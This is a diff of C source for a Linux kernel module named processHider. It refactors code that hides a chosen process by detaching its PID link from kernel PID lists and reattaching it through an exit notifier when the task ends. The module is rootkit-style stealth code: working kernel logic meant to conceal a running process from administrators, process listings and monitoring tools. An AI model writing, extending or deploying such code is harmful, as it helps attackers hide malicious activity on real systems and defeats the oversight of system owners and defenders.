@@ -5,47 +5,34 @@
 
 #include "messagesToUser.h"
 #include "processHider.h"
+#include "processHiderPidManipulation.h"
 
 #ifndef CONFIG_PROFILING
 	#error "this module requires config profiling enabled"
 #endif
 
-// prototypes for functions from pid.c
+//todo: prevent hiding processes that are already hidden..  test this..
 
-static struct pid *__changePidAndGetOldPid(struct task_struct *task, enum pid_type type, struct pid *new);
-struct pid *detachPidAndGetOldPid(struct task_struct *task, enum pid_type type);
-static struct pid *changePidAndGetOldPid(struct task_struct *task, enum pid_type type, 	struct pid *pid);
-static int hideProcess(int pidNumber);
 
 //todo: group these to allow hiding multiple tasks..
-static void *hiddenTask = NULL;
-struct pid *oldPidToRestore = NULL;
+struct restorableHiddenTask {
+	void *task;
+	struct pid *originalPid;
+};
 
-int notificationFunction(struct notifier_block *notifierBlock, unsigned long unknownLong, void *task) {
-	//printInfo("in notification function for exit - task is %p\n", task);
-	if (task == hiddenTask) {
+struct restorableHiddenTask onlyHiddenTask = {NULL};
 
-		{
-			//TODO: check which pid type to restore - this may put too many in..
-			struct pid *pid = oldPidToRestore;
-			rcu_read_lock(); 	//TODO: hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h
-
-			attach_pid(task, PIDTYPE_PID, pid);
-
-			rcu_read_unlock();
-		}
-
-		//TODO: restore oldPidToRestore
-		printInfo("about to exit for PID THAT WAS HIDDEN - finished unhiding it to allow exit\n");
-
-		hiddenTask = NULL;
-	}
+// Function Prototyps
+static int hideProcess(int pidNumber);
+static struct restorableHiddenTask hideProcessGivenRcuLockIsHeldAndReturnRestorableHiddenTask(struct pid *pid);
+static int notificationFunctionOnTaskExit(struct notifier_block *notifierBlock, unsigned long unknownLong, void *task);
+static int isTaskHidden(void *task);
+//
 
 
-	return 0;
-}
+
 struct notifier_block notificationOnProcessExit = {
-	.notifier_call = notificationFunction,
+	.notifier_call = notificationFunctionOnTaskExit,
 	.next = NULL,// TODO: CHECK THIS
 	.priority = 1, // TODO: CHECK THIS
 };
@@ -80,7 +67,6 @@ void processHider_exit(void) {
 	error = profile_event_unregister(PROFILE_TASK_EXIT, &notificationOnProcessExit);
 }
 
-
 //returns error code...
 //PRESENTLY ONLY SUPPORTS HIDING ONE PROCESS
 static int hideProcess(int pidNumber) {
@@ -89,76 +75,52 @@ static int hideProcess(int pidNumber) {
 		return 1;
 	}
 	
-	rcu_read_lock(); 	//TODO: hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h
+	rcu_read_lock(); 	// hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h
 	
-	{
-		struct task_struct *task = pid_task(pid, PIDTYPE_PID);
-		printInfo("hiding task");
-
-		if (hiddenTask != NULL) {
-			printInfo("warning another task was already hidden - this is not supported properly yet\n");
-		}
-		hiddenTask = task;
-		
-		oldPidToRestore = detachPidAndGetOldPid(task, PIDTYPE_PID);
+	if (onlyHiddenTask.task != NULL) {
+		printInfo("warning another task was already hidden - this is not supported properly yet\n");
 	}
+
+	onlyHiddenTask = hideProcessGivenRcuLockIsHeldAndReturnRestorableHiddenTask(pid);
 	
 	rcu_read_unlock();
-	
-	//todo release lock..
-	
-	printInfo("pid points to %p\n", pid); // TODO: print time etc..
 	
 	return 0;
 }
 
 
-//from linux kernel... version... pid.c
+static struct restorableHiddenTask hideProcessGivenRcuLockIsHeldAndReturnRestorableHiddenTask(struct pid *pid) {
+	struct task_struct *task = pid_task(pid, PIDTYPE_PID); 	//TODO: ensure task is not null perhaps..
+	struct pid *originalPid = detachPidAndGetOldPid(task, PIDTYPE_PID);
 
-void attach_pid(struct task_struct *task, enum pid_type type,
-		struct pid *pid)
-{
-	struct pid_link *link;
+	struct restorableHiddenTask result = {
+		.task = task,
+		.originalPid = originalPid,
+	};
 
-	link = &task->pids[type];
-	link->pid = pid;
-	hlist_add_head_rcu(&link->node, &pid->tasks[type]);
+	return result;
 }
 
-static struct pid *__changePidAndGetOldPid(struct task_struct *task, enum pid_type type,
-			struct pid *new)
-{
-	struct pid_link *link;
-	struct pid *oldPid;
-	int tmp;
+static int notificationFunctionOnTaskExit(struct notifier_block *notifierBlock, unsigned long unknownLong, void *task) {
+	//printInfo("in notification function for exit - task is %p\n", task);
+	if (isTaskHidden(task)) {
+		//TODO: add support for hiding multiple tasks / get restorable task struct that corresponds to pid..
 
-	link = &task->pids[type];
-	oldPid = link->pid;
+		struct restorableHiddenTask taskToRestore = onlyHiddenTask;
+		rcu_read_lock(); 	// hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h
 
-	hlist_del_rcu(&link->node);
-	link->pid = new;
+		attach_pid(task, PIDTYPE_PID, taskToRestore.originalPid);
 
-	//TODO: store each old pid to enable them to be stored as is....
-	for (tmp = PIDTYPE_MAX; --tmp >= 0; ) {
-		if (!hlist_empty(&oldPid->tasks[tmp])) {
-			printError("pid still in use / stopped early\n");
-			return oldPid;
-		}
+		rcu_read_unlock();
+
+		onlyHiddenTask.task = NULL; //mark as no longer hidden
 	}
 
-	// don't free so that it can be re-assigned again later
-	return oldPid;
+
+	return 0;
 }
 
-struct pid *detachPidAndGetOldPid(struct task_struct *task, enum pid_type type)
-{
-	return __changePidAndGetOldPid(task, type, NULL);
+static int isTaskHidden(void *task) {
+	return (task == onlyHiddenTask.task);
 }
 
-struct pid *changePidAndGetOldPid(struct task_struct *task, enum pid_type type,
-		struct pid *pid)
-{
-	struct pid *oldPid =__changePidAndGetOldPid(task, type, pid);
-	attach_pid(task, type, pid);
-	return oldPid;
-}
